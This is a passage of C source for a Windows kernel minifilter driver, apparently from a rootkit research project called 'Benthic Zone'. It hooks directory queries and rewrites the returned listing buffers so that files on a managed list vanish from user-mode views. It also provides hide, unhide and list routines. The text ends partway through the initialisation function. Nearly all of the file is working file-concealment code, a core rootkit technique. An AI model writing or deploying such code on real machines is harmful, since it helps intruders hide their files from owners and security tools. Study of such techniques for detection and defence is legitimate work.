// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/
// This header is used by ifsk.
#include <fltkernel.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/
// This header declares functions to handle strings safely (copy, format, concatenate, etc.) and avoid buffer overflows
#include <ntstrsafe.h>


// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "../Utils/Utils00Resources.h"



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Global reference to the filter driver object
PFLT_FILTER Global_MiniFilter_Filter = NULL;

// Lock for protecting access to resource list
ERESOURCE Global_MiniFilter_ResourceLock;

// Head of the linked list of hidden files
PSTRUCTURE_UTILSRESOURCES_GENERIC_ENTRY Global_MiniFilter_HiddenFilesListHead = NULL;

// Counter for number of hidden files
ULONG Global_MiniFilter_HiddenFilesListCount = 0;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Pre-operation callback for IRP_MJ_DIRECTORY_CONTROL.


	@see            PFLT_CALLBACK_DATA                          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_callback_data
	@param[in,out]  Data                                        Pointer to the callback data structure for the current operation.

	@see		    PCFLT_RELATED_OBJECTS                       https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects
	@param[in]      FltObjects                                  Pointer to the FLT_RELATED_OBJECTS structure for the operation.

	@param[in,out]  CompletionContext                           Optional context passed to the post-operation callback.


	@return         FLT_PREOP_SUCCESS_WITH_CALLBACK if the post-callback should be invoked, FLT_PREOP_SUCCESS_NO_CALLBACK otherwise.
**/
FLT_PREOP_CALLBACK_STATUS
TechniquesMiniFilter_OnPreDirectoryControl(
	_Inout_         PFLT_CALLBACK_DATA                          Data,
	_In_            PCFLT_RELATED_OBJECTS                       FltObjects,
	_Inout_         PVOID*                                      CompletionContext
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);


	// ---------------------------------------------------------------------------------------------------------------------
	// Only allow post-callback for user-mode directory queries (This avoids processing irrelevant system or kernel-mode operations)
	if (Data->RequestorMode == KernelMode || Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY)
	{
		// Skip post-operation callback
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Allow the post-callback to be invoked
	return FLT_PREOP_SUCCESS_WITH_CALLBACK;
}



/**
	@brief          Normalizes a UNICODE path by trimming the trailing backslash.
	@details        This utility is used to ensure consistent path comparison. If the input path ends with a
					backslash (e.g., "\\Device\\HarddiskVolume1\\Folder\\"), the trailing backslash is removed
					in the output to avoid mismatches during string comparisons.

	@param[in]      Input                                       Pointer to the original UNICODE_STRING to normalize.
	@param[out]     Output                                      Pointer to a UNICODE_STRING that receives the normalized path.

	@return         This function does not return a value. The normalized path is written into the output parameter.
**/
VOID
TechniquesMiniFilter_NormalizePath(
	_In_            PUNICODE_STRING                             Input,
	_Out_           PUNICODE_STRING                             Output
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Copy input path structure to output
	*Output = *Input;


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the path ends with a backslash and remove it
	if (Output->Length >= sizeof(WCHAR) && Output->Buffer[(Output->Length / sizeof(WCHAR)) - 1] == L'\\')
	{
		Output->Length -= sizeof(WCHAR);
	}
}



/**
	@brief          Post-operation callback for IRP_MJ_DIRECTORY_CONTROL.
	@details        Modifies directory listing buffer to remove entries for hidden files.


	@see            PFLT_CALLBACK_DATA                          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_callback_data
	@param[in,out]  Data                                        Pointer to the callback data structure.

	@see		    PCFLT_RELATED_OBJECTS                       https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects
	@param[in]      FltObjects                                  Pointer to FLT_RELATED_OBJECTS for the operation.

	@param[in]      CompletionContext                           Optional context passed from pre-callback.

	@param[in]      Flags                                       Post-operation flags.

	@return         FLT_POSTOP_FINISHED_PROCESSING after modifying or validating the buffer.
**/
FLT_POSTOP_CALLBACK_STATUS
TechniquesMiniFilter_OnPostDirectoryControl(
	_Inout_         PFLT_CALLBACK_DATA                          Data,
	_In_            PCFLT_RELATED_OBJECTS                       FltObjects,
	_In_            PVOID                                       CompletionContext,
	_In_            FLT_POST_OPERATION_FLAGS                    Flags
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(CompletionContext);


	// ---------------------------------------------------------------------------------------------------------------------
	// Skip processing if running in KernelMode, not a query operation, or being drained
	if (Data->RequestorMode == KernelMode || Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY || (Flags & FLTFL_POST_OPERATION_DRAINING))
	{
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Extract directory listing parameters
	PFLT_PARAMETERS params = &Data->Iopb->Parameters;
	PVOID directoryBuffer = params->DirectoryControl.QueryDirectory.DirectoryBuffer;


	// ---------------------------------------------------------------------------------------------------------------------
	// Get the full DOS path of the current directory object
	POBJECT_NAME_INFORMATION dosPath = NULL;
	if (!NT_SUCCESS(IoQueryFileDosDeviceName(FltObjects->FileObject, &dosPath)) || !dosPath)
	{
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get the mapped buffer base (from MDL or direct pointer)
	PUCHAR base = NULL;
	if (params->DirectoryControl.QueryDirectory.MdlAddress)
	{
		// The MmGetSystemAddressForMdlSafe macro returns a nonpaged system-space virtual address for the buffer that the specified MDL describes.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmgetsystemaddressformdlsafe
		base = (PUCHAR)MmGetSystemAddressForMdlSafe(params->DirectoryControl.QueryDirectory.MdlAddress, NormalPagePriority);
	}
	if (!base)
	{
		base = (PUCHAR)directoryBuffer;
	}

	// If still invalid, free and skip
	if (!base)
	{
		ExFreePool(dosPath);
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Determine directory information structure format
	static const FILE_INFORMATION_DEFINITION defs[] = {
		FileFullDirectoryInformationDefinition,
		FileBothDirectoryInformationDefinition,
		FileDirectoryInformationDefinition,
		FileNamesInformationDefinition,
		FileIdFullDirectoryInformationDefinition,
		FileIdBothDirectoryInformationDefinition,
		FileIdExtdDirectoryInformationDefinition,
		FileIdGlobalTxDirectoryInformationDefinition
	};

	const FILE_INFORMATION_DEFINITION* actual = NULL;
	for (size_t i = 0; i < ARRAYSIZE(defs); ++i)
	{
		if (defs[i].Class == params->DirectoryControl.QueryDirectory.FileInformationClass)
		{
			actual = &defs[i];
			break;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Unsupported FileInformationClass
	if (!actual)
	{
		ExFreePool(dosPath);
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Lock the hidden files list before scanning/modifying
	ExAcquireResourceExclusiveLite(&Global_MiniFilter_ResourceLock, TRUE);


	// ---------------------------------------------------------------------------------------------------------------------
	// Loop
	PSTRUCTURE_UTILSRESOURCES_GENERIC_ENTRY entry = Global_MiniFilter_HiddenFilesListHead;
	while (entry)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Convert ASCII identifier to UNICODE_STRING
		UNICODE_STRING hiddenFileName;
		WCHAR wideIdentifier[260] = { 0 };
		ULONG converted = 0;

		// The RtlMultiByteToUnicodeN routine translates the specified source string into a Unicode string, using the current system ANSI code page (ACP). The source string is not necessarily from a multibyte character set.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlmultibytetounicoden
		RtlMultiByteToUnicodeN(wideIdentifier, sizeof(wideIdentifier), &converted, entry->Identifier, (ULONG)strlen(entry->Identifier) + 1);

		// The function initializes a counted string of Unicode characters.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring
		RtlInitUnicodeString(&hiddenFileName, wideIdentifier);


		// -----------------------------------------------------------------------------------------------------------------
		// Get parent directory portion
		UNICODE_STRING parentDir;
		parentDir.Buffer = hiddenFileName.Buffer;
		parentDir.Length = (USHORT)((wcsrchr(hiddenFileName.Buffer, L'\\') - hiddenFileName.Buffer) * sizeof(WCHAR));
		parentDir.MaximumLength = parentDir.Length;


		// -----------------------------------------------------------------------------------------------------------------
		// Normalize both current directory path and hidden entry's parent path
		UNICODE_STRING normalizedParentDir, normalizedDosPath;
		TechniquesMiniFilter_NormalizePath(&parentDir, &normalizedParentDir);
		TechniquesMiniFilter_NormalizePath(&dosPath->Name, &normalizedDosPath);


		// -----------------------------------------------------------------------------------------------------------------
		// Match only if we are in the same parent directory
		if (RtlEqualUnicodeString(&normalizedParentDir, &normalizedDosPath, TRUE))
		{

			// -------------------------------------------------------------------------------------------------------------
			// Extract file name from full path
			PWSTR fileName = wcsrchr(hiddenFileName.Buffer, L'\\');
			if (!fileName || *(fileName + 1) == L'\0')
			{
				entry = entry->Next;
				continue;
			}
			fileName++;


			// -------------------------------------------------------------------------------------------------------------
			// Scan and parse the result buffer
			PUCHAR current = base;
			PUCHAR previous = NULL;
			ULONG nextOffset = 0;

			// We iterate over each FILE_DIRECTORY_INFORMATION-like entry in the result buffer, checking for file names that match our hidden list. If found, we adjust the offsets to remove them from the output without corrupting the linked structure.
			do {
				PULONG nextEntryOffset = (PULONG)(current + actual->NextEntryOffset);
				PULONG fileNameLengthPtr = (PULONG)(current + actual->FileNameLengthOffset);
				PWCHAR fileNamePtr = (PWCHAR)(current + actual->FileNameOffset);

				nextOffset = *nextEntryOffset;
				ULONG fileNameLen = *fileNameLengthPtr;


				// ---------------------------------------------------------------------------------------------------------
				// Compare entry name with the hidden file name
				if (fileNameLen > 0)
				{
					WCHAR tempName[256] = { 0 };
					ULONG copyLen = min(fileNameLen / sizeof(WCHAR), 255);
					RtlCopyMemory(tempName, fileNamePtr, copyLen * sizeof(WCHAR));
					tempName[copyLen] = L'\0';

					if (_wcsicmp(tempName, fileName) == 0)
					{
						DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (OnPostDirectoryControl) - Hiding file/folder: %S\n", fileName);

						// If this is the first entry in the list, advance the buffer pointer
						if (!previous)
						{
							params->DirectoryControl.QueryDirectory.DirectoryBuffer = current + nextOffset;
							FltSetCallbackDataDirty(Data);
						}
						// Otherwise, adjust previous entry's offset to skip the current one
						else
						{
							((PFILE_DIRECTORY_INFORMATION)previous)->NextEntryOffset += nextOffset;
						}

						// STOP scanning buffer for this hidden entry (to avoid corruption)
						break;
					}
				}

				previous = current;
				current += nextOffset;

			} while (nextOffset != 0);
		}

		entry = entry->Next;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Unlock and free resources

	// The ExReleaseResourceLite routine releases a specified executive resource owned by the current thread.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exreleaseresourcelite
	ExReleaseResourceLite(&Global_MiniFilter_ResourceLock);

	// The ExFreePool routine deallocates a block of pool memory.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exfreepool
	ExFreePool(dosPath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return FLT_POSTOP_FINISHED_PROCESSING;
}



// START -> GLOBALS - CALLBACK DEFINITIONS ----------------------------------------------------------------------------------------------------
// START -> GLOBALS - CALLBACK DEFINITIONS ----------------------------------------------------------------------------------------------------



// Callback registration array

// The FLT_OPERATION_REGISTRATION structure is used to register operation callback routines.
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_operation_registration
CONST FLT_OPERATION_REGISTRATION Global_MiniHideUnhideFile_Callbacks[] = {
	{
		IRP_MJ_DIRECTORY_CONTROL,
		0,
		TechniquesMiniFilter_OnPreDirectoryControl,
		TechniquesMiniFilter_OnPostDirectoryControl
	},
	{ IRP_MJ_OPERATION_END }
};



/**
	@brief          Wrapper that hides a file using the MiniFilter.


	@param[out]     responseBuffer                              Output message buffer.

	@param[in]      responseBufferSize                          Size of the buffer.

	@param[in]      filePath                                    Path of the file to hide.


	@return         A NTSTATUS value indicating success or an error code if the file could not be hidden.
**/
NTSTATUS
TechniquesMiniFilter_Hide(
	_Out_           char*                                       responseBuffer,
	_In_            size_t                                      responseBufferSize,
	_In_            const char*                                 filePath
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Hide) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Validate input
	if (!filePath || strlen(filePath) == 0)
	{
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Invalid file path.");
		return STATUS_INVALID_PARAMETER;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the resource is already present in the tracking list
	if (UtilsResources_IsPresent(Global_MiniFilter_HiddenFilesListHead, STRUCTURE_UTILSRESOURCES_TYPE_FILE, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, filePath))
	{
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "File is already hidden.");
		return STATUS_ALREADY_REGISTERED;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Add to resource list
	if (!UtilsResources_Add(&Global_MiniFilter_HiddenFilesListHead, &Global_MiniFilter_HiddenFilesListCount, STRUCTURE_UTILSRESOURCES_TYPE_FILE, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, filePath))
	{
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to add file to hidden list.");
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Inform user-space that the file was successfully hidden

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(responseBuffer, responseBufferSize, "File %s hidden.", filePath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Hide) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Wrapper that restores a hidden files using index in resource list.


	@param[out]     responseBuffer                              Output message buffer.

	@param[in]      responseBufferSize                          Size of the buffer.

	@param[in]      index                                       Index of the hidden file to restore.


	@return         A NTSTATUS value indicating success or an error code if the process could not be restored.
**/
NTSTATUS
TechniquesMiniFilter_Unhide(
	_Out_           char*                                       responseBuffer,
	_In_            size_t                                      responseBufferSize,
	_In_            ULONG                                       index
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Unhide) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve the identifier (File path) from the resource list using the provided index
	CHAR filePath[260] = { 0 };
	if (!UtilsResources_GetIdentifierByIndex(Global_MiniFilter_HiddenFilesListHead, index, filePath, sizeof(filePath)))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "No file found for index %lu.", index);
		return STATUS_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Remove from list
	if (!UtilsResources_Remove(&Global_MiniFilter_HiddenFilesListHead, &Global_MiniFilter_HiddenFilesListCount, index))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Failed to remove file entry at index %lu.", index);
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Confirm success to user-space

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(responseBuffer, responseBufferSize, "File at index %lu unhidden.", index);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Unhide) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Lists all files currently hidden via the MiniFilter.


	@param[out]     responseBuffer                              Output message buffer.

	@param[in]      responseBufferSize                          Size of the buffer.


	@return         A NTSTATUS value indicating success or an error code if the list was truncated.
**/
NTSTATUS
TechniquesMiniFilter_HideUnhideFile_List(
	_Out_           char*                                       responseBuffer,
	_In_            size_t                                      responseBufferSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the list is empty
	if (Global_MiniFilter_HiddenFilesListHead == NULL)
	{
		// The RtlStringCbCopyW and RtlStringCbCopyA functions copy a byte-counted string into a buffer.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbcopya
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "No hidden files found.");
		return STATUS_SUCCESS;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Dump hidden files into the response buffer
	return UtilsResources_List(Global_MiniFilter_HiddenFilesListHead, responseBuffer, responseBufferSize);
}



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Unload callback for the minifilter driver.
	@details        This function is called when the driver is being unloaded. It performs cleanup by unregistering the filter from the Filter Manager and deleting the global resource used to protect the hidden files list.


	@see            FLT_INSTANCE_TEARDOWN_FLAGS                 https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_instance_teardown_callback
	@param[in]      Flags                                       Flags describing how the filter is being unloaded.


	@return         A NTSTATUS value indicating success or an error code if the cleanup fails.
**/
NTSTATUS
TechniquesMiniFilter_Unload(
	_In_            FLT_FILTER_UNLOAD_FLAGS                     Flags
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(Flags);


	// ---------------------------------------------------------------------------------------------------------------------
    // Hello
    DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Unload) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Unregister the minifilter from the Filter Manager
    DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Unload) - Unregister the minifilter from the Filter Manager");

	// A registered minifilter driver calls FltUnregisterFilter to unregister itself so that the Filter Manager no longer calls it to process I/O operations.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltunregisterfilter
	FltUnregisterFilter(Global_MiniFilter_Filter);


	// ---------------------------------------------------------------------------------------------------------------------
	// Delete the global resource used to protect the hidden files list
    DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Unload) - Delete the global resource used to protect the hidden files list");

	// The ExDeleteResourceLite routine deletes a given resource from the system's resource list.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exdeleteresourcelite
	ExDeleteResourceLite(&Global_MiniFilter_ResourceLock);


	// ---------------------------------------------------------------------------------------------------------------------
    // Bye
    DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Unload) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Called during instance setup to determine if this volume should be attached.
	@details        This function is invoked when the minifilter is being attached to a volume. It allows attaching only if the filesystem type is NTFS, rejecting others to avoid unnecessary overhead or incompatibility.


	@see		    PCFLT_RELATED_OBJECTS                       https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects
	@param[in]      FltObjects                                  Pointer to the filter-related objects.

	@see            FLT_INSTANCE_TEARDOWN_FLAGS                 https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_instance_teardown_callback
	@param[in]      Flags                                       Flags that indicate how the instance is being set up.

	@param[in]      VolumeDeviceType                            Type of device for the volume.

	@see            FLT_FILESYSTEM_TYPE                         https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltuserstructures/ne-fltuserstructures-_flt_filesystem_type
	@param[in]      VolumeFilesystemType                        Filesystem type of the volume.


	@return         A NTSTATUS value indicating success if NTFS, or STATUS_FLT_DO_NOT_ATTACH to skip other filesystems.
**/
NTSTATUS
TechniquesMiniFilter_HideInstanceSetup(
	_In_            PCFLT_RELATED_OBJECTS                       FltObjects,
	_In_            FLT_INSTANCE_SETUP_FLAGS                    Flags,
	_In_            DEVICE_TYPE                                 VolumeDeviceType,
	_In_            FLT_FILESYSTEM_TYPE                         VolumeFilesystemType
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(VolumeDeviceType);


	// ---------------------------------------------------------------------------------------------------------------------
	// Log
	// DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter/HideUnhideFile.c] (HideInstanceSetup) - HideInstanceSetup called for filesystem type %u\n", VolumeFilesystemType);


	// ---------------------------------------------------------------------------------------------------------------------
	// Log
	return (VolumeFilesystemType == FLT_FSTYPE_NTFS) ? STATUS_SUCCESS : STATUS_FLT_DO_NOT_ATTACH;
}



/**
	@brief          Query teardown callback for a filter instance.
	@details        This function is called when the Filter Manager is checking whether it is safe to tear down an instance.


	@see		    PCFLT_RELATED_OBJECTS                       https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects
	@param[in]      FltObjects                                  Pointer to the filter-related objects.

	@see            FLT_INSTANCE_TEARDOWN_FLAGS                 https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_instance_teardown_callback
	@param[in]      Flags                                       Flags describing the teardown query.


	@return         A NTSTATUS value indicating that teardown is permitted.
**/
NTSTATUS
TechniquesMiniFilter_HideInstanceQueryTeardown(
	_In_            PCFLT_RELATED_OBJECTS                       FltObjects,
	_In_            FLT_INSTANCE_QUERY_TEARDOWN_FLAGS           Flags
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Notifies the start of the teardown of a filter instance.
	@details        Called when the Filter Manager starts to detach the filter from a volume. This is a notification only; no cleanup is required.


	@see		    PCFLT_RELATED_OBJECTS                       https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects
	@param[in]      FltObjects                                  Pointer to the filter-related objects.

	@see            FLT_INSTANCE_TEARDOWN_FLAGS                 https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_instance_teardown_callback
	@param[in]      Flags                                       Flags describing the teardown process.


	@return         None
**/
VOID
TechniquesMiniFilter_HideInstanceTeardownStart(
	_In_            PCFLT_RELATED_OBJECTS                       FltObjects,
	_In_            FLT_INSTANCE_TEARDOWN_FLAGS                 Flags
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
}



/**
	@brief          Notifies the completion of the teardown of a filter instance.
	@details        Called after the filter has been completely detached from a volume. This function performs no cleanup and simply acknowledges the event.


	@see		    PCFLT_RELATED_OBJECTS                       https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects
	@param[in]      FltObjects                                  Pointer to the filter-related objects.

	@see            FLT_INSTANCE_TEARDOWN_FLAGS                 https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_instance_teardown_callback
	@param[in]      Flags                                       Flags describing the teardown completion.


	@return         None
**/
VOID
TechniquesMiniFilter_HideInstanceTeardownComplete(
	_In_            PCFLT_RELATED_OBJECTS                       FltObjects,
	_In_            FLT_INSTANCE_TEARDOWN_FLAGS                 Flags
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
}



// START -> GLOBALS - FILTER DEFINITIONS ------------------------------------------------------------------------------------------------------
// START -> GLOBALS - FILTER DEFINITIONS ------------------------------------------------------------------------------------------------------



// Filter registration structure

// The FLT_REGISTRATION structure is passed as a parameter to FltRegisterFilter.
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_registration
CONST FLT_REGISTRATION Global_MiniFilter_FilterRegistration = {
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	0,
	NULL,
	Global_MiniHideUnhideFile_Callbacks,
	TechniquesMiniFilter_Unload,
	TechniquesMiniFilter_HideInstanceSetup,
	TechniquesMiniFilter_HideInstanceQueryTeardown,
	TechniquesMiniFilter_HideInstanceTeardownStart,
	TechniquesMiniFilter_HideInstanceTeardownComplete,
};



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Initializes the mini-filter and registers directory control callbacks.


	@see            PDRIVER_OBJECT                              https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param[in]      pDriverObject                               Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.

	@see            PUNICODE_STRING                             https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
	@param[in]      pRegistryPath                               Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.


	@return         A NTSTATUS value indicating success or an error code if initialization fails.
**/
NTSTATUS
TechniquesMiniFilter_Init(
	_In_            PDRIVER_OBJECT                              pDriverObject,
	_In_            PUNICODE_STRING                             pRegistryPath
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter. We're not using the registry path, so we need to mark it as unreferenced.
	UNREFERENCED_PARAMETER(pRegistryPath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Init) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize the ERESOURCE used to protect the list

	// The ExInitializeResourceLite routine initializes a resource variable.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exinitializeresourcelite
	ExInitializeResourceLite(&Global_MiniFilter_ResourceLock);


	// ---------------------------------------------------------------------------------------------------------------------
	// Register the filter

	// FltRegisterFilter registers a minifilter driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltregisterfilter
	NTSTATUS status = FltRegisterFilter(pDriverObject, &Global_MiniFilter_FilterRegistration, &Global_MiniFilter_Filter);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Init) - ERROR: FltRegisterFilter failed (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Start filtering I/O operations

	// FltStartFiltering starts filtering for a registered minifilter driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltstartfiltering
	status = FltStartFiltering(Global_MiniFilter_Filter);

	// Failed
	if (!NT_SUCCESS(status))
	{
		// A registered minifilter driver calls FltUnregisterFilter to unregister itself so that the Filter Manager no longer calls it to process I/O operations.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltunregisterfilter
		FltUnregisterFilter(Global_MiniFilter_Filter);
		Global_MiniFilter_Filter = NULL;
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/MiniFilter.c] (Init) - ERROR: FltStartFiltering failed (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
